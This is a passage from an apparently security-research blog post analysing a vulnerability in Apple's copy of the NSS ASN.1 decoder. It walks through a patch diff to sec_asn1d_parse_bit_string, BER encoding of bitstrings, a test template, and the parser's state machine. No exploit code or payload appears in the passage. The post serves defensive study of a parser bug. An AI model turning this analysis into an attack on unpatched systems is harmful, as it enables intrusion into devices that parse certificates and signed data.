 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp;</span><span class="c16">return</span><span class="c3">&nbsp;NULL</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp;</span><span class="c1">}</span></p>
 <p class="c6"><span class="c2">&nbsp;</span></p>
 <p class="c6"><span class="c1">@@</span><span class="c3">&nbsp;</span><span class="c1">-</span><span class="c11">1794</span><span class="c1">,</span><span class="c11">19</span><span class="c3">&nbsp;</span><span class="c1">+</span><span class="c11">1791</span><span class="c1">,</span><span class="c11">13</span><span class="c3">&nbsp;</span><span class="c1">@@</span><span class="c3">&nbsp;sec_asn1d_parse_bit_string </span><span class="c1">(</span><span class="c3">sec_asn1d_state </span><span class="c1">*</span><span class="c3">state</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp;</span><span class="c23">/*PORT_Assert (state-&gt;pending &gt; 0); */</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp;PORT_Assert </span><span class="c1">(</span><span class="c3">state</span><span class="c1">-&gt;</span><span class="c3">place </span><span class="c1">==</span><span class="c3">&nbsp;beforeBitString</span><span class="c1">);</span></p>
 <p class="c6"><span class="c2">&nbsp;</span></p>
 <p class="c6"><span class="c1 c12">-</span><span class="c3 c12">&nbsp; &nbsp; </span><span class="c16 c12">if</span><span class="c3 c12">&nbsp;</span><span class="c1 c12">((</span><span class="c3 c12">state</span><span class="c1 c12">-&gt;</span><span class="c3 c12">pending </span><span class="c1 c12">==</span><span class="c3 c12">&nbsp;</span><span class="c11 c12">0</span><span class="c1 c12">)</span><span class="c3 c12">&nbsp;</span><span class="c1 c12">||</span><span class="c3 c12">&nbsp;</span><span class="c1 c12">(</span><span class="c3 c12">state</span><span class="c1 c12">-&gt;</span><span class="c3 c12">contents_length </span><span class="c1 c12">==</span><span class="c3 c12">&nbsp;</span><span class="c11 c12">1</span><span class="c1 c12">))</span><span class="c3 c12">&nbsp;</span><span class="c1 c12">{</span></p>
 <p class="c6"><span class="c1 c4">+</span><span class="c3 c4">&nbsp; &nbsp; </span><span class="c16 c4">if</span><span class="c3 c4">&nbsp;</span><span class="c1 c4">(</span><span class="c3 c4">state</span><span class="c1 c4">-&gt;</span><span class="c3 c4">pending </span><span class="c1 c4">==</span><span class="c3 c4">&nbsp;</span><span class="c11 c4">0</span><span class="c1 c4">)</span><span class="c3 c4">&nbsp;</span><span class="c1 c4">{</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c16">if</span><span class="c3">&nbsp;</span><span class="c1">(</span><span class="c3">state</span><span class="c1">-&gt;</span><span class="c3">dest </span><span class="c1">!=</span><span class="c3">&nbsp;NULL</span><span class="c1">)</span><span class="c3">&nbsp;</span><span class="c1">{</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c20">SecAsn1Item</span><span class="c3">&nbsp;</span><span class="c1">*</span><span class="c3">item </span><span class="c1">=</span><span class="c3">&nbsp;</span><span class="c1">(</span><span class="c20">SecAsn1Item</span><span class="c3">&nbsp;</span><span class="c1">*)(</span><span class="c3">state</span><span class="c1">-&gt;</span><span class="c3">dest</span><span class="c1">);</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; item</span><span class="c1">-&gt;</span><span class="c20">Data</span><span class="c3">&nbsp;</span><span class="c1">=</span><span class="c3">&nbsp;NULL</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; item</span><span class="c1">-&gt;</span><span class="c20">Length</span><span class="c3">&nbsp;</span><span class="c1">=</span><span class="c3">&nbsp;</span><span class="c11">0</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; state</span><span class="c1">-&gt;</span><span class="c3">place </span><span class="c1">=</span><span class="c3">&nbsp;beforeEndOfContents</span><span class="c1">;</span></p>
 <p class="c6"><span class="c1 c12">-</span><span class="c3 c12">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c1 c12">}</span></p>
 <p class="c6"><span class="c1 c12">-</span><span class="c3 c12">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c16 c12">if</span><span class="c1 c12">(</span><span class="c3 c12">state</span><span class="c1 c12">-&gt;</span><span class="c3 c12">contents_length </span><span class="c1 c12">==</span><span class="c3 c12">&nbsp;</span><span class="c11 c12">1</span><span class="c1 c12">)</span><span class="c3 c12">&nbsp;</span><span class="c1 c12">{</span></p>
 <p class="c6"><span class="c1 c12">-</span><span class="c3 c12">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c23 c12">/* skip over (unused) remainder byte */</span></p>
 <p class="c6"><span class="c1 c12">-</span><span class="c3 c12">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c16 c12">return</span><span class="c3 c12">&nbsp;</span><span class="c11 c12">1</span><span class="c1 c12">;</span></p>
 <p class="c6"><span class="c1 c12">-</span><span class="c3 c12">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c1 c12">}</span></p>
 <p class="c6"><span class="c1 c12">-</span><span class="c3 c12">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c16 c12">else</span><span class="c3 c12">&nbsp;</span><span class="c1 c12">{</span></p>
 <p class="c6"><span class="c1 c12">-</span><span class="c3 c12">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c16 c12">return</span><span class="c3 c12">&nbsp;</span><span class="c11 c12">0</span><span class="c1 c12">;</span></p>
 <p class="c6"><span class="c1 c4">+</span><span class="c3 c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c16 c4">return</span><span class="c3 c4">&nbsp;</span><span class="c11 c4">0</span><span class="c1 c4">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c1">}</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp;</span><span class="c1">}</span></p></td></tr></tbody></table>
 <p class="c0"><span class="c9"></span></p>
 <p class="c6 c8"><span>The first change (removing the </span><span class="c7">PORT_Free</span><span class="c9">) is immaterial for Apple&#39;s use case as it&#39;s fixing a double free which doesn&#39;t impact Apple&#39;s build. It&#39;s only relevant when &quot;allocator marks&quot; are enabled and this feature is disabled.</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c6 c8"><span>The vulnerability must therefore be in </span><span class="c7">sec_asn1d_parse_bit_string</span><span class="c9">. We know from xerub&#39;s tweet that something goes wrong with a state machine, but to figure it out we need to cover some ASN.1 basics and then start looking at how the NSS ASN.1 state machine works.</span></p><h2 class="c32 c8" id="h.niqtzuiy3s6j"><span class="c31 c28">ASN.1 encoding</span></h2>
 <p class="c6 c8"><span>ASN.1 is a Type-Length-Value serialization format, but with the neat quirk that it can also handle the case when you don&#39;t know the length of the value, but want to serialize it anyway! That quirk is only possible when ASN.1 is encoded according to </span><span>Basic Encoding Rules (BER.) There is a stricter encoding called DER (Distinguished Encoding Rules)</span><span class="c9">&nbsp;which enforces that a particular value only has a single correct encoding and disallows the cases where you can serialize values without knowing their eventual lengths.</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c6 c8"><span class="c21"><a class="c241" href="https://luca.ntop.org/Teaching/Appunti/asn1.html">This page is a nice beginner&#39;s guide to ASN.1</a></span><span class="c9">. I&#39;d really recommend skimming that to get a good overview of ASN.1.</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c6 c8"><span class="c9">There are a lot of built-in types in ASN.1. I&#39;m only going to describe the minimum required to understand this vulnerability (mostly because I don&#39;t know any more than that!) So let&#39;s just start from the very first byte of a serialized ASN.1 object and figure out how to decode it:</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c6 c8"><span>This first byte tells you the type, with the least significant 5 bits defining the type identifier. The special type identifier value of </span><span class="c7">0x1f</span><span class="c9">&nbsp;tells you that the type identifier doesn&#39;t fit in those 5 bits and is instead encoded in a different way (which we&#39;ll ignore):</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c6 c8"></p>
  
 <p class="c6 c8"><span class="c9"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEizzg9gXNiEAlpqdPX6dIJ-pzEqqCLLQgRmv0BPkemfLnoeJFYJVgOPrEm6MR8HJMgX88oyMorrni9bnqDYcIuTjMuqF4gqF9q-Upt4tvTQAlzJMoO5u1ZcgAYcSt6eGnLaXeqSQyDO1D2tV4BXPquPyyzosMl00q5xBdmHucTkCxNRKIWkLSXj0KyR/s600/image6%20%281%29%281%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEizzg9gXNiEAlpqdPX6dIJ-pzEqqCLLQgRmv0BPkemfLnoeJFYJVgOPrEm6MR8HJMgX88oyMorrni9bnqDYcIuTjMuqF4gqF9q-Upt4tvTQAlzJMoO5u1ZcgAYcSt6eGnLaXeqSQyDO1D2tV4BXPquPyyzosMl00q5xBdmHucTkCxNRKIWkLSXj0KyR/s600/image6%20%281%29%281%29.png" border="0" alt="Diagram showing first two bytes of a serialized ASN.1 object. The first byte in this case is the type and class identifier and the second is the length." style="max-height: 750; max-width: 600px;" title="Diagram showing first two bytes of a serialized ASN.1 object. The first byte in this case is the type and class identifier and the second is the length." /></a></span></p>
 <p class="c34 c8"><span class="c27 c26">Diagram showing first two bytes of a serialized ASN.1 object. The first byte in this case is the type and class identifier and the second is the length.</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c6 c8"><span class="c9">The upper two bits of the first byte tell you the class of the type: universal, application, content-specific or private. For us, we&#39;ll leave that as 0 (universal.)</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c6 c8"><span>Bit 6 is where the fun starts. A value of 1 tells us that this is a </span><span class="c17">primitive</span><span>&nbsp;encoding which means that following the length are content bytes which can be directly interpreted as the intended type. For example, a primitive encoding of the string &quot;HELLO&quot; as an ASN.1 </span><span class="c7">printable string</span><span>&nbsp;would have a length byte of </span><span class="c7">5</span><span>&nbsp;followed by the ASCII characters &quot;</span><span class="c7">HELLO</span><span class="c9">&quot;. All fairly straightforward.</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c6 c8"><span>A value of 0 for bit 6 however tells us that this is a </span><span class="c17">constructed</span><span>&nbsp;encoding. This means that the bytes following the length are not the &quot;raw&quot; content bytes for the type but are instead ASN.1 encodings of one or more &quot;chunks&quot; which need to be individually parsed and concatenated to form the final output value. And to make things extra complicated it&#39;s also possible to specify a length value of </span><span class="c7">0</span><span class="c9">&nbsp;which means that you don&#39;t even know how long the reconstructed output will be or how much of the subsequent input will be required to completely build the output.</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c6 c8"><span>This final case (of a constructed type with indefinite length) is known as </span><span class="c17">indefinite</span><span>&nbsp;form. The end of the input which makes up a single indefinite value is signaled by a serialized type with the identifier, constructed, class and length values all equal to </span><span class="c7">0</span><span>&nbsp;, which is encoded as two </span><span class="c7">NULL</span><span class="c9">&nbsp;bytes.</span></p><h2 class="c32 c8" id="h.iu15q8vvc4lc"><span class="c31 c28">ASN.1 bitstrings</span></h2>
 <p class="c6 c8"><span>Most of the ASN.1 string types require no special treatment; they&#39;re just buffers of raw bytes. Some of them have length restrictions. For example: a </span><span class="c7">BMP</span><span>&nbsp;string must have an even length and a </span><span class="c7">UNIVERSAL</span><span class="c9">&nbsp;string must be a multiple of 4 bytes in length, but that&#39;s about it.</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c6 c8"><span>ASN.1 </span><span class="c7">bitstrings</span><span>&nbsp;are strings of bits as opposed to bytes. You could for example have a bitstring with a length of a single bit (so either a </span><span class="c7">0</span><span>&nbsp;or </span><span class="c7">1</span><span class="c9">) or a bitstring with a length of 127 bits (so 15 full bytes plus an extra 7 bits.) </span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c6 c8"><span>Encoded ASN.1 </span><span class="c7">bitstrings</span><span>&nbsp;have an extra metadata byte after the length but before the contents, which encodes the number of unused </span><span class="c17">bits</span><span class="c9">&nbsp;in the final byte.</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c6 c8"></p>
  
 <p class="c6 c8"><span class="c9"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhozw2VvZycyqovtb9-AdzBUGQAUR8Bt9lGRG4A0LS9aMYAohwNVGi7CAFrCGUG6Y3SGu1iFvpn85ZrrPiA0f6dxo2Qy18ypN6sf_LG7mNNMICekk9VOcWHMDE7ZtRoZQyeIiWhKr8D0Od3frzIFnEc6oYPM0CG9kGk4QWUVSAxMrqoD6km_Cy5V1ww/s1165/image1%20%282%29%283%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhozw2VvZycyqovtb9-AdzBUGQAUR8Bt9lGRG4A0LS9aMYAohwNVGi7CAFrCGUG6Y3SGu1iFvpn85ZrrPiA0f6dxo2Qy18ypN6sf_LG7mNNMICekk9VOcWHMDE7ZtRoZQyeIiWhKr8D0Od3frzIFnEc6oYPM0CG9kGk4QWUVSAxMrqoD6km_Cy5V1ww/s1165/image1%20%282%29%283%29.png" border="0" alt="Diagram showing the complete encoding of a 3-bit bitstring. The length of 2 includes the unused-bits count byte which has a value of 5, indicating that only the 3 most-significant bits of the final byte are valid." style="max-height: 750; max-width: 600px;"title="Diagram showing the complete encoding of a 3-bit bitstring. The length of 2 includes the unused-bits count byte which has a value of 5, indicating that only the 3 most-significant bits of the final byte are valid." /></a></span></p>
 <p class="c34 c8"><span class="c27 c26">Diagram showing the complete encoding of a 3-bit bitstring. The length of 2 includes the unused-bits count byte which has a value of 5, indicating that only the 3 most-significant bits of the final byte are valid.</span></p>
 <p class="c8 c14 c34"><span class="c26 c27"></span></p><h2 class="c32 c8" id="h.9dutmbj0iutz"><span class="c31 c28">Parsing ASN.1</span></h2>
 <p class="c6 c8"><span class="c9">ASN.1 data always needs to be decoded in tandem with a template that tells the parser what data to expect and also provides output pointers to be filled in with the parsed output data. Here&#39;s the template my test program uses to exercise the bitstring code:</span></p>
 <p class="c0"><span class="c9"></span></p><a id="t.e816d0e76cff75906d870663f8d39eaa14fc6487"></a><a id="t.1"></a><table class="c25"><tbody><tr class="c18"><td class="c5" colspan="1" rowspan="1">
 <p class="c6"><span class="c16">const</span><span class="c3">&nbsp;</span><span class="c20">SecAsn1Template</span><span class="c3">&nbsp;simple_bitstring_template</span><span class="c1">[]</span><span class="c3">&nbsp;</span><span class="c1">=</span><span class="c3">&nbsp;</span><span class="c1">{</span></p>
 <p class="c6"><span class="c3">&nbsp; </span><span class="c1">{</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; SEC_ASN1_BIT_STRING </span><span class="c1">|</span><span class="c3">&nbsp;SEC_ASN1_MAY_STREAM</span><span class="c1">,</span><span class="c3">&nbsp;</span><span class="c23">// kind: bit string,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c23">// &nbsp;may be constructed</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; </span><span class="c11">0</span><span class="c1">,</span><span class="c3">&nbsp; &nbsp; &nbsp;</span><span class="c23">// offset: in dest/src</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; NULL</span><span class="c1">,</span><span class="c3">&nbsp; </span><span class="c23">// sub: subtemplate for indirection</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; </span><span class="c16">sizeof</span><span class="c1">(</span><span class="c20">SecAsn1Item</span><span class="c1">)</span><span class="c3">&nbsp;</span><span class="c23">// size: of output structure</span></p>
 <p class="c6"><span class="c3">&nbsp; </span><span class="c1">}</span></p>
 <p class="c6"><span class="c1">};</span></p></td></tr></tbody></table>
 <p class="c0"><span class="c9"></span></p>
 <p class="c6 c8"><span>A </span><span class="c7">SecASN1Item</span><span>&nbsp;is a very simple wrapper around a buffer. We can provide a </span><span class="c7">SecAsn1Item</span><span class="c9">&nbsp;for the parser to use to return the parsed bitstring then call the parser:</span></p>
 <p class="c0"><span class="c9"></span></p><a id="t.800141608823d3e78f5e3937494968c764bff2e1"></a><a id="t.2"></a><table class="c25"><tbody><tr class="c18"><td class="c5" colspan="1" rowspan="1">
 <p class="c6"><span class="c20">SecAsn1Item</span><span class="c3">&nbsp;decoded </span><span class="c1">=</span><span class="c3">&nbsp;</span><span class="c1">{</span><span class="c11">0</span><span class="c1">};</span></p>
 <p class="c6 c14"><span class="c2"></span></p>
 <p class="c6"><span class="c20">PLArenaPool</span><span class="c1">*</span><span class="c3">&nbsp;pool </span><span class="c1">=</span><span class="c3">&nbsp;PORT_NewArena</span><span class="c1">(</span><span class="c11">1024</span><span class="c1">);</span></p>
 <p class="c6 c14"><span class="c2"></span></p>
 <p class="c6"><span class="c20">SECStatus</span><span class="c3">&nbsp;status </span><span class="c1">=</span></p>
 <p class="c6"><span class="c3">&nbsp; SEC_ASN1Decode</span><span class="c1">(</span><span class="c3">pool</span><span class="c1">,</span><span class="c3">&nbsp; &nbsp; &nbsp;</span><span class="c23">// pool: arena for destination allocations</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c1">&amp;</span><span class="c3">decoded</span><span class="c1">,</span><span class="c3">&nbsp;</span><span class="c23">// dest: decoded encoded items in to here</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c1">&amp;</span><span class="c3">simple_bitstring_template</span><span class="c1">,</span><span class="c3">&nbsp;</span><span class="c23">// template</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;asn1_bytes</span><span class="c1">,</span><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c23">// buf: asn1 input bytes</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;asn1_bytes_len</span><span class="c1">);</span><span class="c3">&nbsp;</span><span class="c23">// len: input size</span></p></td></tr></tbody></table><h2 class="c32 c8" id="h.ge5rhouvh4pm"><span class="c28 c31">NSS ASN.1 state machine</span></h2>
 <p class="c6 c8"><span class="c9">The state machine has two core data structures:</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c6 c8"><span class="c7">SEC_ASN1DecoderContext</span><span class="c9">&nbsp;- the overall parsing context</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c6 c8"><span class="c7">sec_asn1d_state</span><span class="c9">&nbsp;- a single parser state, kept in a doubly-linked list forming a stack of nested states</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c6 c8"><span class="c9">Here&#39;s a trimmed version of the state object showing the relevant fields:</span></p>
 <p class="c0"><span class="c9"></span></p><a id="t.6e6d0d518a15f071678c6483b9dc57daeed428e3"></a><a id="t.3"></a><table class="c25"><tbody><tr class="c18"><td class="c5" colspan="1" rowspan="1">
 <p class="c6"><span class="c16">typedef</span><span class="c3">&nbsp;</span><span class="c16">struct</span><span class="c3">&nbsp;sec_asn1d_state_struct </span><span class="c1">{</span></p>
 <p class="c6"><span class="c3">&nbsp; SEC_ASN1DecoderContext </span><span class="c1">*</span><span class="c3">top</span><span class="c1">;</span><span class="c2">&nbsp;</span></p>
 <p class="c6"><span class="c3">&nbsp; </span><span class="c16">const</span><span class="c3">&nbsp;</span><span class="c20">SecAsn1Template</span><span class="c3">&nbsp;</span><span class="c1">*</span><span class="c3">theTemplate</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; </span><span class="c16">void</span><span class="c3">&nbsp;</span><span class="c1">*</span><span class="c3">dest</span><span class="c1">;</span></p>
 <p class="c6"><span class="c2">&nbsp;</span></p>
 <p class="c6"><span class="c3">&nbsp; </span><span class="c16">struct</span><span class="c3">&nbsp;sec_asn1d_state_struct </span><span class="c1">*</span><span class="c3">parent</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; </span><span class="c16">struct</span><span class="c3">&nbsp;sec_asn1d_state_struct </span><span class="c1">*</span><span class="c3">child</span><span class="c1">;</span></p>
 <p class="c6"><span class="c2">&nbsp;</span></p>
 <p class="c6"><span class="c3">&nbsp; sec_asn1d_parse_place place</span><span class="c1">;</span></p>
 <p class="c6"><span class="c2">&nbsp;</span></p>
 <p class="c6"><span class="c3">&nbsp; </span><span class="c16">unsigned</span><span class="c3">&nbsp;</span><span class="c16">long</span><span class="c3">&nbsp;contents_length</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; </span><span class="c16">unsigned</span><span class="c3">&nbsp;</span><span class="c16">long</span><span class="c3">&nbsp;pending</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; </span><span class="c16">unsigned</span><span class="c3">&nbsp;</span><span class="c16">long</span><span class="c3">&nbsp;consumed</span><span class="c1">;</span></p>
 <p class="c6 c14"><span class="c2"></span></p>
 <p class="c6"><span class="c3">&nbsp; </span><span class="c16">int</span><span class="c3">&nbsp;depth</span><span class="c1">;</span></p>
 <p class="c6"><span class="c1">}</span><span class="c3">&nbsp;sec_asn1d_state</span><span class="c1">;</span></p></td></tr></tbody></table>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>The main engine of the parsing state machine is the method </span><span class="c7">SEC_ASN1DecoderUpdate</span><span class="c9">&nbsp;which takes a context object, raw input buffer and length:</span></p>
 <p class="c0 c15"><span class="c9"></span></p><a id="t.ca1f754aaf2b9b2a69a0b772c008c3066c24eed5"></a><a id="t.4"></a><table class="c25"><tbody><tr class="c18"><td class="c5" colspan="1" rowspan="1">
 <p class="c6"><span class="c20">SECStatus</span></p>
 <p class="c6"><span class="c3">SEC_ASN1DecoderUpdate </span><span class="c1">(</span><span class="c3">SEC_ASN1DecoderContext </span><span class="c1">*</span><span class="c3">cx</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c16">const</span><span class="c3">&nbsp;</span><span class="c16">char</span><span class="c3">&nbsp;</span><span class="c1">*</span><span class="c3">buf</span><span class="c1">,</span><span class="c3">&nbsp;size_t len</span><span class="c1">)</span></p></td></tr></tbody></table>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>The current state is stored in the context object&#39;s </span><span class="c7">current</span><span>&nbsp;field, and that current </span><span class="c7">state</span><span>&#39;s </span><span class="c7">place</span><span class="c9">&nbsp;field determines the current state which the parser is in. Those states are defined here:</span></p>
 <p class="c0 c15"><span class="c9"></span></p><a id="t.58b2c4a0a10300b6306e34913640a092d86c5d56"></a><a id="t.5"></a><table class="c25"><tbody><tr class="c18"><td class="c5" colspan="1" rowspan="1">
 <p class="c6"><span class="c1">&#8203;&#8203;</span><span class="c16">typedef</span><span class="c3">&nbsp;</span><span class="c16">enum</span><span class="c3">&nbsp;</span><span class="c1">{</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; beforeIdentifier</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; duringIdentifier</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; afterIdentifier</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; beforeLength</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; duringLength</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; afterLength</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; beforeBitString</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; duringBitString</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; duringConstructedString</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; duringGroup</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; duringLeaf</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; duringSaveEncoding</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; duringSequence</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; afterConstructedString</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; afterGroup</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; afterExplicit</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; afterImplicit</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; afterInline</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; afterPointer</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; afterSaveEncoding</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; beforeEndOfContents</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; duringEndOfContents</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; afterEndOfContents</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; beforeChoice</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; duringChoice</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; afterChoice</span><span class="c1">,</span></p>
 <p class="c6"><span class="c2">&nbsp; &nbsp; notInUse</span></p>
 <p class="c6"><span class="c1">}</span><span class="c3">&nbsp;sec_asn1d_parse_place</span><span class="c1">;</span></p></td></tr></tbody></table>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>The state machine loop switches on the </span><span class="c7">place</span><span class="c9">&nbsp;field to determine which method to call:</span></p>
 <p class="c0 c15"><span class="c9"></span></p><a id="t.34b38de34f5f395cb1366034a4fd68d5d626ae2c"></a><a id="t.6"></a><table class="c25"><tbody><tr class="c18"><td class="c5" colspan="1" rowspan="1">
 <p class="c6"><span class="c3">&nbsp; </span><span class="c16">switch</span><span class="c3">&nbsp;</span><span class="c1">(</span><span class="c3">state</span><span class="c1">-&gt;</span><span class="c3">place</span><span class="c1">)</span><span class="c3">&nbsp;</span><span class="c1">{</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; </span><span class="c16">case</span><span class="c3">&nbsp;beforeIdentifier</span><span class="c1">:</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; consumed </span><span class="c1">=</span><span class="c3">&nbsp;sec_asn1d_parse_identifier </span><span class="c1">(</span><span class="c3">state</span><span class="c1">,</span><span class="c3">&nbsp;buf</span><span class="c1">,</span><span class="c3">&nbsp;len</span><span class="c1">);</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; what </span><span class="c1">=</span><span class="c3">&nbsp;SEC_ASN1_Identifier</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c16">break</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; </span><span class="c16">case</span><span class="c3">&nbsp;duringIdentifier</span><span class="c1">:</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; consumed </span><span class="c1">=</span><span class="c3">&nbsp;sec_asn1d_parse_more_identifier </span><span class="c1">(</span><span class="c3">state</span><span class="c1">,</span><span class="c3">&nbsp;buf</span><span class="c1">,</span><span class="c3">&nbsp;len</span><span class="c1">);</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; what </span><span class="c1">=</span><span class="c3">&nbsp;SEC_ASN1_Identifier</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; </span><span class="c16">break</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; </span><span class="c16">case</span><span class="c3">&nbsp;afterIdentifier</span><span class="c1">:</span></p>
